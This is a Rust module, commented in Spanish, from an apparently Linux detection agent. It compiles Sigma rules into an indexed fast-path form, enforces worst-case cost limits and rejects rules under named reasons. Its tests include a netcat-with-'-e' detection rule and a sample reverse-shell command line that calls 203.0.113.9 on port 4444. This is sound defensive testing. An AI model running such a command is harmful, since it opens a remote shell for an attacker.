//! La forma de camino caliente: reglas de Linux atadas a los campos que el
//! agente produce, con su coste en el peor caso calculado al cargar.
//!
//! # Del nombre al indice
//!
//! La representacion intermedia ([`crate::regla`]) busca los campos por nombre
//! en un mapa: bien para la fabrica, caro por evento. Aqui cada campo de la regla
//! se resuelve UNA vez a un [`Campo`] y el evento es una tabla fija
//! ([`Registro`]) indexada por el: evaluar no reserva memoria ni compara nombres.
//!
//! # Lo que se rechaza al cargar, con nombre
//!
//! | Codigo | Por que |
//! |---|---|
//! | `sigma-producto` | `logsource.product` no es `linux` |
//! | `sigma-servicio` | pide un servicio (`auditd`, `sysmon`...) que el agente no lee |
//! | `sigma-categoria` | una categoria que la telemetria no produce |
//! | `sigma-campo-sin-telemetria` | un campo que el agente no rellena en esa categoria: la regla se evaluaria siempre con el campo ausente y callaria para siempre |
//! | `sigma-re-sin-motor` | usa `\|re`: el agente no evalua expresiones regulares |
//! | `sigma-demasiadas-selecciones` | mas de [`MAX_SELECCIONES`] |
//! | `sigma-cuantificador-cero` | `0 of ...`, que no dice nada |
//! | `sigma-coste` | su coste en el peor caso pasa de [`COSTE_MAX_REGLA`] |
//! | `sigma-juego-lleno` | el de su categoria pasaria de [`COSTE_MAX_CATEGORIA`] |
//! | `sigma-duplicada` | otra regla con el mismo `id` ya esta cargada |
//!
//! Un campo que falta en un evento concreto (el padre de un proceso que el
//! agente no vio nacer) es otra cosa: la regla se evalua con el campo ausente,
//! que no cumple ninguna condicion salvo la de vacio. Los filtros (`and not`)
//! fallan hacia DETECTAR, nunca hacia callar.

use std::collections::BTreeSet;

use crate::regla::{
    compilar_regla, nombre_casa, Comparacion, Condicion, Expresion, Nivel, ReglaSigma, Topes,
};

/// Bytes de un campo que se miran como mucho. La sonda ya corta la linea de
/// comandos a 128 bytes y las rutas a 256; esto es el tope del motor si un dia
/// la sonda da mas, y con el se calcula el coste en el peor caso.
pub const MAX_CAMPO: usize = 1024;
/// Selecciones de una regla.
pub const MAX_SELECCIONES: usize = 32;
/// Pasos de comparacion de una regla en el peor caso.
///
/// Da para unas treinta busquedas sobre un campo al tope; una regla que
/// necesite mas no es una regla, es un diccionario, y su sitio es el motor de
/// patrones.
pub const COSTE_MAX_REGLA: u64 = 64 * 1024;
/// Pasos de comparacion de todas las reglas de una categoria en el peor caso.
///
/// Es la cota dura del motor por evento. El caso tipico es mucho menor: una
/// regla se descarta en cuanto falla su primera seleccion, casi siempre un
/// sufijo de `Image` que cuesta cinco o seis pasos.
pub const COSTE_MAX_CATEGORIA: u64 = 1024 * 1024;

/// Categoria de fuente de eventos de Sigma que el agente produce.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum Categoria {
    /// `process_creation`: cada `execve`.
    CreacionProceso,
    /// `file_event`: apertura para escritura y renombrado.
    EventoFichero,
    /// `network_connection`: cada `connect` TCP saliente.
    ConexionRed,
}

impl Categoria {
    /// Todas.
    pub const TODAS: [Categoria; 3] = [
        Categoria::CreacionProceso,
        Categoria::EventoFichero,
        Categoria::ConexionRed,
    ];

    /// El nombre en Sigma.
    #[must_use]
    pub fn nombre(self) -> &'static str {
        match self {
            Categoria::CreacionProceso => "process_creation",
            Categoria::EventoFichero => "file_event",
            Categoria::ConexionRed => "network_connection",
        }
    }

    /// Desde el nombre en Sigma.
    #[must_use]
    pub fn desde(nombre: &str) -> Option<Categoria> {
        Categoria::TODAS
            .into_iter()
            .find(|c| c.nombre().eq_ignore_ascii_case(nombre.trim()))
    }

    /// Los campos que el agente rellena en esta categoria.
    #[must_use]
    pub fn campos(self) -> &'static [Campo] {
        match self {
            Categoria::CreacionProceso => &[
                Campo::Imagen,
                Campo::LineaComandos,
                Campo::ImagenPadre,
                Campo::LineaComandosPadre,
                Campo::Pid,
            ],
            Categoria::EventoFichero => &[
                Campo::Imagen,
                Campo::FicheroDestino,
                Campo::FicheroOrigen,
                Campo::Pid,
            ],
            Categoria::ConexionRed => &[
                Campo::Imagen,
                Campo::IpDestino,
                Campo::PuertoDestino,
                Campo::DestinoIpv6,
                Campo::Iniciada,
                Campo::Pid,
            ],
        }
    }

    fn indice(self) -> usize {
        match self {
            Categoria::CreacionProceso => 0,
            Categoria::EventoFichero => 1,
            Categoria::ConexionRed => 2,
        }
    }
}

/// Un campo de la taxonomia de Sigma que el agente sabe rellenar.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum Campo {
    /// `Image`: ruta del ejecutable del proceso.
    Imagen,
    /// `CommandLine`: argumentos unidos por espacios.
    LineaComandos,
    /// `ParentImage`.
    ImagenPadre,
    /// `ParentCommandLine`.
    LineaComandosPadre,
    /// `ProcessId`.
    Pid,
    /// `TargetFilename`: fichero escrito, o destino de un renombrado.
    FicheroDestino,
    /// `SourceFilename`: origen de un renombrado.
    FicheroOrigen,
    /// `DestinationIp`.
    IpDestino,
    /// `DestinationPort`.
    PuertoDestino,
    /// `DestinationIsIpv6`: `true` o `false`.
    DestinoIpv6,
    /// `Initiated`: `true` (el agente solo ve conexiones salientes).
    Iniciada,
}

impl Campo {
    /// Cuantos hay.
    pub const TOTAL: usize = 11;

    /// Todos, en el orden de su indice.
    pub const TODOS: [Campo; Campo::TOTAL] = [
        Campo::Imagen,
        Campo::LineaComandos,
        Campo::ImagenPadre,
        Campo::LineaComandosPadre,
        Campo::Pid,
        Campo::FicheroDestino,
        Campo::FicheroOrigen,
        Campo::IpDestino,
        Campo::PuertoDestino,
        Campo::DestinoIpv6,
        Campo::Iniciada,
    ];

    /// El nombre en Sigma.
    #[must_use]
    pub fn nombre(self) -> &'static str {
        match self {
            Campo::Imagen => "Image",
            Campo::LineaComandos => "CommandLine",
            Campo::ImagenPadre => "ParentImage",
            Campo::LineaComandosPadre => "ParentCommandLine",
            Campo::Pid => "ProcessId",
            Campo::FicheroDestino => "TargetFilename",
            Campo::FicheroOrigen => "SourceFilename",
            Campo::IpDestino => "DestinationIp",
            Campo::PuertoDestino => "DestinationPort",
            Campo::DestinoIpv6 => "DestinationIsIpv6",
            Campo::Iniciada => "Initiated",
        }
    }

    /// Desde el nombre en Sigma (exacto, como lo escribe la taxonomia).
    #[must_use]
    pub fn desde(nombre: &str) -> Option<Campo> {
        Campo::TODOS.into_iter().find(|c| c.nombre() == nombre)
    }

    fn indice(self) -> usize {
        // El orden de `TODOS` es el de la declaracion.
        self as usize
    }
}

/// Un evento visto como tabla fija de campos. No copia nada: apunta a los
/// bytes del evento.
#[derive(Debug, Clone, Copy, Default)]
pub struct Registro<'a> {
    valores: [Option<&'a [u8]>; Campo::TOTAL],
}

impl<'a> Registro<'a> {
    /// Sin ningun campo.
    #[must_use]
    pub fn nuevo() -> Registro<'a> {
        Registro::default()
    }

    /// Pone un campo, cortado a [`MAX_CAMPO`] bytes. Devuelve si hubo que
    /// cortar, para contarlo.
    pub fn poner(&mut self, campo: Campo, valor: &'a [u8]) -> bool {
        let cortado = valor.len() > MAX_CAMPO;
        self.valores[campo.indice()] = Some(&valor[..valor.len().min(MAX_CAMPO)]);
        cortado
    }

    /// El valor de un campo, si esta.
    #[must_use]
    pub fn valor(&self, campo: Campo) -> Option<&'a [u8]> {
        self.valores[campo.indice()]
    }
}

#[derive(Debug, Clone)]
pub(crate) enum Nodo {
    Sel(usize),
    Todos(Vec<Nodo>),
    Alguno(Vec<Nodo>),
    No(Box<Nodo>),
    AlMenos(usize, Vec<usize>),
}

#[derive(Debug, Clone)]
pub(crate) struct SeleccionCompacta {
    pub(crate) alternativas: Vec<Vec<(Campo, Condicion)>>,
}

impl SeleccionCompacta {
    fn casa(&self, r: &Registro<'_>) -> bool {
        self.alternativas
            .iter()
            .any(|cs| cs.iter().all(|(campo, c)| c.casa_valor(r.valor(*campo))))
    }
}

/// Una regla lista para el camino caliente.
#[derive(Debug, Clone)]
pub struct ReglaCompacta {
    id: String,
    titulo: String,
    nivel: Nivel,
    categoria: Categoria,
    etiquetas: Vec<String>,
    pub(crate) selecciones: Vec<SeleccionCompacta>,
    pub(crate) condicion: Nodo,
    coste: u64,
    campos: BTreeSet<Campo>,
    memoria: usize,
}

/// Por que una regla no se pudo compactar.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ErrorCompacta {
    /// Codigo estable.
    pub codigo: &'static str,
    /// Detalle legible.
    pub detalle: String,
}

fn error(codigo: &'static str, detalle: String) -> ErrorCompacta {
    ErrorCompacta { codigo, detalle }
}

impl ReglaCompacta {
    /// Ata una regla compilada a la telemetria del agente.
    ///
    /// # Errores
    /// [`ErrorCompacta`] con uno de los codigos de la tabla del modulo.
    pub fn desde(r: &ReglaSigma) -> Result<ReglaCompacta, ErrorCompacta> {
        let producto = r.fuente.get("product").map_or("", String::as_str);
        if !producto.eq_ignore_ascii_case("linux") {
            return Err(error(
                "sigma-producto",
                format!("producto «{producto}»: el agente es de Linux"),
            ));
        }
        if let Some(s) = r.fuente.get("service") {
            return Err(error(
                "sigma-servicio",
                format!("el servicio «{s}» no es telemetria del agente"),
            ));
        }
        let nombre_cat = r.fuente.get("category").map_or("", String::as_str);
        let categoria = Categoria::desde(nombre_cat).ok_or_else(|| {
            error(
                "sigma-categoria",
                format!("la categoria «{nombre_cat}» no la produce la telemetria del agente"),
            )
        })?;

        let nombres: Vec<&String> = r.selecciones.keys().collect();
        if nombres.len() > MAX_SELECCIONES {
            return Err(error(
                "sigma-demasiadas-selecciones",
                format!(
                    "{} selecciones, por encima de {MAX_SELECCIONES}",
                    nombres.len()
                ),
            ));
        }

        let mut selecciones = Vec::with_capacity(nombres.len());
        let mut coste = 0u64;
        let mut campos = BTreeSet::new();
        let mut memoria = 0usize;
        for s in r.selecciones.values() {
            let mut alternativas = Vec::with_capacity(s.alternativas.len());
            for alt in &s.alternativas {
                let mut conds = Vec::with_capacity(alt.len());
                for c in alt {
                    let campo = Campo::desde(&c.campo)
                        .filter(|k| categoria.campos().contains(k))
                        .ok_or_else(|| {
                            error(
                                "sigma-campo-sin-telemetria",
                                format!(
                                    "el campo «{}» no lo rellena el agente en {}",
                                    c.campo,
                                    categoria.nombre()
                                ),
                            )
                        })?;
                    if c.comparacion == Comparacion::Expresion {
                        return Err(error(
                            "sigma-re-sin-motor",
                            format!(
                                "«{}|re»: el agente no evalua expresiones regulares",
                                c.campo
                            ),
                        ));
                    }
                    coste = coste.saturating_add(coste_de(c));
                    memoria += c
                        .patrones()
                        .iter()
                        .flat_map(|p| p.trozos())
                        .map(|t| t.bytes().len() * 3)
                        .sum::<usize>()
                        + 64;
                    campos.insert(campo);
                    conds.push((campo, c.clone()));
                }
                alternativas.push(conds);
            }
            selecciones.push(SeleccionCompacta { alternativas });
        }
        if coste > COSTE_MAX_REGLA {
            return Err(error(
                "sigma-coste",
                format!("{coste} pasos en el peor caso, por encima de {COSTE_MAX_REGLA}"),
            ));
        }

        let condicion = nodo(&r.condicion, &nombres)?;
        Ok(ReglaCompacta {
            id: r.id.clone(),
            titulo: r.titulo.clone(),
            nivel: r.nivel,
            categoria,
            etiquetas: r.etiquetas.clone(),
            selecciones,
            condicion,
            coste,
            campos,
            memoria: memoria + r.id.len() + r.titulo.len() + 128,
        })
    }

    /// Identificador de la regla.
    #[must_use]
    pub fn id(&self) -> &str {
        &self.id
    }

    /// Titulo.
    #[must_use]
    pub fn titulo(&self) -> &str {
        &self.titulo
    }

    /// Nivel declarado.
    #[must_use]
    pub fn nivel(&self) -> Nivel {
        self.nivel
    }

    /// Categoria de eventos a la que se aplica.
    #[must_use]
    pub fn categoria(&self) -> Categoria {
        self.categoria
    }

    /// Etiquetas (ATT&CK).
    #[must_use]
    pub fn etiquetas(&self) -> &[String] {
        &self.etiquetas
    }

    /// Pasos de comparacion en el peor caso.
    #[must_use]
    pub fn coste(&self) -> u64 {
        self.coste
    }

    /// Si la regla mira un campo.
    #[must_use]
    pub fn usa(&self, campo: Campo) -> bool {
        self.campos.contains(&campo)
    }

    /// Si el evento dispara la regla.
    ///
    /// Cada seleccion se evalua como mucho una vez (se recuerda su resultado),
    /// y la condicion se corta en cuanto su valor queda decidido.
    #[must_use]
    pub fn casa(&self, r: &Registro<'_>) -> bool {
        let mut memo = [0u8; MAX_SELECCIONES];
        self.nodo_casa(&self.condicion, r, &mut memo)
    }

    fn seleccion(&self, i: usize, r: &Registro<'_>, memo: &mut [u8; MAX_SELECCIONES]) -> bool {
        match memo[i] {
            1 => false,
            2 => true,
            _ => {
                let v = self.selecciones[i].casa(r);
                memo[i] = if v { 2 } else { 1 };
                v
            }
        }
    }

    fn nodo_casa(&self, n: &Nodo, r: &Registro<'_>, memo: &mut [u8; MAX_SELECCIONES]) -> bool {
        match n {
            Nodo::Sel(i) => self.seleccion(*i, r, memo),
            Nodo::Todos(v) => v.iter().all(|x| self.nodo_casa(x, r, memo)),
            Nodo::Alguno(v) => v.iter().any(|x| self.nodo_casa(x, r, memo)),
            Nodo::No(x) => !self.nodo_casa(x, r, memo),
            Nodo::AlMenos(k, de) => {
                let mut casan = 0usize;
                for i in de {
                    if self.seleccion(*i, r, memo) {
                        casan += 1;
                        if casan >= *k {
                            return true;
                        }
                    }
                }
                false
            }
        }
    }
}

/// Pasos de una condicion en el peor caso.
fn coste_de(c: &Condicion) -> u64 {
    let por_patron: u64 = c.patrones().iter().map(|p| p.coste(MAX_CAMPO)).sum();
    // Las numericas y la de vacio: leer el campo y, a lo sumo, un numero.
    por_patron.max(
        u64::try_from(c.valores.len())
            .unwrap_or(u64::MAX)
            .saturating_mul(24),
    )
}

fn nodo(e: &Expresion, nombres: &[&String]) -> Result<Nodo, ErrorCompacta> {
    Ok(match e {
        Expresion::Seleccion(n) => Nodo::Sel(
            nombres
                .iter()
                .position(|x| *x == n)
                .ok_or_else(|| error("sigma-seleccion-desconocida", n.clone()))?,
        ),
        Expresion::CuantosDe { cuantas, patron } => {
            let de: Vec<usize> = nombres
                .iter()
                .enumerate()
                .filter(|(_, n)| nombre_casa(n, patron))
                .map(|(i, _)| i)
                .collect();
            match cuantas {
                None => Nodo::Todos(de.into_iter().map(Nodo::Sel).collect()),
                Some(0) => {
                    return Err(error(
                        "sigma-cuantificador-cero",
                        format!("«0 of {patron}» no exige nada"),
                    ));
                }
                Some(k) => Nodo::AlMenos(*k, de),
            }
        }
        Expresion::Y(..) => {
            let mut hijos = Vec::new();
            aplanar(e, true, nombres, &mut hijos)?;
            Nodo::Todos(hijos)
        }
        Expresion::O(..) => {
            let mut hijos = Vec::new();
            aplanar(e, false, nombres, &mut hijos)?;
            Nodo::Alguno(hijos)
        }
        Expresion::No(a) => Nodo::No(Box::new(nodo(a, nombres)?)),
    })
}

/// Convierte una cadena de `and` (o de `or`) en un solo nodo con N hijos: la
/// profundidad de la evaluacion deja de crecer con la longitud de la cadena.
fn aplanar(
    e: &Expresion,
    conjuncion: bool,
    nombres: &[&String],
    hijos: &mut Vec<Nodo>,
) -> Result<(), ErrorCompacta> {
    match (e, conjuncion) {
        (Expresion::Y(a, b), true) | (Expresion::O(a, b), false) => {
            aplanar(a, conjuncion, nombres, hijos)?;
            aplanar(b, conjuncion, nombres, hijos)
        }
        _ => {
            hijos.push(nodo(e, nombres)?);
            Ok(())
        }
    }
}

/// Una regla que no entro, con su motivo.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rechazo {
    /// De donde venia (nombre del fichero).
    pub fichero: String,
    /// Codigo estable del motivo.
    pub codigo: &'static str,
    /// Detalle legible.
    pub detalle: String,
}

/// Las reglas cargadas, por categoria, y las que no entraron.
#[derive(Debug, Clone, Default)]
pub struct Juego {
    por_categoria: [Vec<ReglaCompacta>; 3],
    coste: [u64; 3],
    rechazos: Vec<Rechazo>,
}

impl Juego {
    /// Compila y ata cada `(fichero, fuente)`. Lo que no entra queda en
    /// [`Juego::rechazos`] con su motivo: una regla no se pierde en silencio.
    #[must_use]
    pub fn cargar(fuentes: &[(&str, &str)], topes: &Topes) -> Juego {
        // El agente no evalua expresiones regulares: se aceptan en el
        // compilador y la regla entera se rechaza al atarla, con su nombre.
        let aceptar = |_: &str| -> Result<(), String> { Ok(()) };
        let mut juego = Juego::default();
        let mut ids = BTreeSet::new();
        for (fichero, fuente) in fuentes {
            let rechazo = |codigo: &'static str, detalle: String| Rechazo {
                fichero: (*fichero).to_string(),
                codigo,
                detalle,
            };
            let regla = match compilar_regla(fuente, topes, &aceptar) {
                Ok(r) => r,
                Err(e) => {
                    juego.rechazos.push(rechazo(e.codigo(), e.detalle()));
                    continue;
                }
            };
            let compacta = match ReglaCompacta::desde(&regla) {
                Ok(c) => c,
                Err(e) => {
                    juego.rechazos.push(rechazo(e.codigo, e.detalle));
                    continue;
                }
            };
            if !ids.insert(compacta.id.clone()) {
                let d = format!("el id {} ya esta cargado", compacta.id);
                juego.rechazos.push(rechazo("sigma-duplicada", d));
                continue;
            }
            let k = compacta.categoria.indice();
            let nuevo = juego.coste[k].saturating_add(compacta.coste);
            if nuevo > COSTE_MAX_CATEGORIA {
                let d = format!(
                    "{} con esta regla sumaria {nuevo} pasos, por encima de {COSTE_MAX_CATEGORIA}",
                    compacta.categoria.nombre()
                );
                juego.rechazos.push(rechazo("sigma-juego-lleno", d));
                continue;
            }
            juego.coste[k] = nuevo;
            juego.por_categoria[k].push(compacta);
        }
        juego
    }

    /// Las reglas de una categoria.
    #[must_use]
    pub fn reglas(&self, categoria: Categoria) -> &[ReglaCompacta] {
        &self.por_categoria[categoria.indice()]
    }

    /// Pasos en el peor caso de las reglas de una categoria.
    #[must_use]
    pub fn coste(&self, categoria: Categoria) -> u64 {
        self.coste[categoria.indice()]
    }

    /// Si alguna regla de la categoria mira el campo.
    #[must_use]
    pub fn usa(&self, categoria: Categoria, campo: Campo) -> bool {
        self.reglas(categoria).iter().any(|r| r.usa(campo))
    }

    /// Las que no entraron.
    #[must_use]
    pub fn rechazos(&self) -> &[Rechazo] {
        &self.rechazos
    }

    /// Reglas cargadas.
    #[must_use]
    pub fn len(&self) -> usize {
        self.por_categoria.iter().map(Vec::len).sum()
    }

    /// Si no hay ninguna.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }

    /// Bytes aproximados que retienen las reglas.
    #[must_use]
    pub fn memoria(&self) -> usize {
        self.por_categoria.iter().flatten().map(|r| r.memoria).sum()
    }
}

#[cfg(test)]
mod pruebas {
    use super::*;

    fn juego(fuentes: &[(&str, &str)]) -> Juego {
        Juego::cargar(fuentes, &Topes::default())
    }

    const REGLA: &str = r#"
title: Netcat con ejecucion
id: prueba-1
logsource:
    product: linux
    category: process_creation
detection:
    imagen:
        Image|endswith:
            - '/nc'
            - '/ncat'
    ejecucion:
        CommandLine|contains: ' -e '
    condition: imagen and ejecucion
level: high
"#;

    fn registro<'a>(imagen: &'a str, linea: &'a str) -> Registro<'a> {
        let mut r = Registro::nuevo();
        let _ = r.poner(Campo::Imagen, imagen.as_bytes());
        let _ = r.poner(Campo::LineaComandos, linea.as_bytes());
        r
    }

    #[test]
    fn una_regla_de_linux_se_carga_y_casa_por_indice() {
        let j = juego(&[("nc.yml", REGLA)]);
        assert!(j.rechazos().is_empty(), "{:?}", j.rechazos());
        let r = &j.reglas(Categoria::CreacionProceso)[0];
        assert!(r.casa(&registro("/usr/bin/nc", "nc -e /bin/sh 203.0.113.9 4444")));
        assert!(!r.casa(&registro("/usr/bin/nc", "nc -zv 10.0.0.1 22")));
        assert!(!r.casa(&registro("/usr/bin/ssh", "ssh -e none x")));
        assert!(r.coste() > 0 && r.coste() <= COSTE_MAX_REGLA);
        assert!(j.usa(Categoria::CreacionProceso, Campo::Imagen));
        assert!(!j.usa(Categoria::CreacionProceso, Campo::ImagenPadre));
    }

    /// Un campo que el agente no produce se rechaza al cargar, con su nombre:
    /// si entrara, la regla callaria para siempre sin que nadie lo supiera.
    #[test]
    fn lo_que_la_telemetria_no_puede_evaluar_se_rechaza_con_nombre() {
        let casos: &[(&str, &str, &str)] = &[
            ("product: linux", "product: windows", "sigma-producto"),
            (
                "category: process_creation",
                "category: registry_set",
                "sigma-categoria",
            ),
            (
                "Image|endswith:",
                "User|endswith:",
                "sigma-campo-sin-telemetria",
            ),
            (
                "CommandLine|contains: ' -e '",
                "CommandLine|re: ' -e '",
                "sigma-re-sin-motor",
            ),
            (
                "category: process_creation",
                "category: process_creation\n    service: auditd",
                "sigma-servicio",
            ),
        ];
        for (de, a, codigo) in casos {
            let f = REGLA.replace(de, a);
            let j = juego(&[("x.yml", f.as_str())]);
            assert_eq!(j.len(), 0, "{codigo}");
            assert_eq!(j.rechazos()[0].codigo, *codigo, "{:?}", j.rechazos());
        }
        let j = juego(&[("a.yml", REGLA), ("b.yml", REGLA)]);
        assert_eq!(j.len(), 1);
        assert_eq!(j.rechazos()[0].codigo, "sigma-duplicada");
    }

    /// El coste acotado por regla y por categoria se impone AL CARGAR.
    #[test]
    fn una_regla_o_un_juego_que_no_cabe_se_rechaza_al_cargar() {
        let muchos: String = (0..40)
            .map(|i| format!("            - 'patron{i}'\n"))
            .collect();
        let cara = REGLA.replace(
            "        CommandLine|contains: ' -e '\n",
            &format!("        CommandLine|contains:\n{muchos}"),
        );
        let j = juego(&[("cara.yml", cara.as_str())]);
        assert_eq!(j.rechazos()[0].codigo, "sigma-coste", "{:?}", j.rechazos());

        let fuentes: Vec<String> = (0..600)
            .map(|i| REGLA.replace("id: prueba-1", &format!("id: prueba-{i}")))
            .collect();
        let pares: Vec<(&str, &str)> = fuentes.iter().map(|f| ("n.yml", f.as_str())).collect();
        let j = juego(&pares);
        assert!(j.coste(Categoria::CreacionProceso) <= COSTE_MAX_CATEGORIA);
        assert!(j.rechazos().iter().all(|r| r.codigo == "sigma-juego-lleno"));
        assert!(!j.rechazos().is_empty());
    }

    #[test]
    fn un_campo_largo_se_corta_y_se_dice() {
        let largo = [b'a'; MAX_CAMPO + 10];
        let mut r = Registro::nuevo();
        assert!(r.poner(Campo::LineaComandos, &largo));
        assert_eq!(
            r.valor(Campo::LineaComandos).map(<[u8]>::len),
            Some(MAX_CAMPO)
        );
        assert!(!r.poner(Campo::Imagen, b"/usr/bin/x"));
    }

    #[test]
    fn las_cadenas_largas_se_aplanan_y_los_cuantificadores_se_resuelven() {
        let fuente = r#"
title: Cuantificadores
id: prueba-q
logsource:
    product: linux
    category: process_creation
detection:
    sel_a:
        CommandLine|contains: 'uno'
    sel_b:
        CommandLine|contains: 'dos'
    sel_c:
        CommandLine|contains: 'tres'
    filtro:
        Image|endswith: '/inocuo'
    condition: 2 of sel_* and not filtro
"#;
        let j = juego(&[("q.yml", fuente)]);
        let r = &j.reglas(Categoria::CreacionProceso)[0];
        assert!(r.casa(&registro("/usr/bin/x", "uno dos")));
        assert!(!r.casa(&registro("/usr/bin/x", "uno")));
        assert!(!r.casa(&registro("/usr/bin/inocuo", "uno dos tres")));
        // Sin el campo del filtro, el filtro no se cumple y la regla DETECTA.
        let mut sin_imagen = Registro::nuevo();
        let _ = sin_imagen.poner(Campo::LineaComandos, b"uno tres");
        assert!(r.casa(&sin_imagen));
    }
}
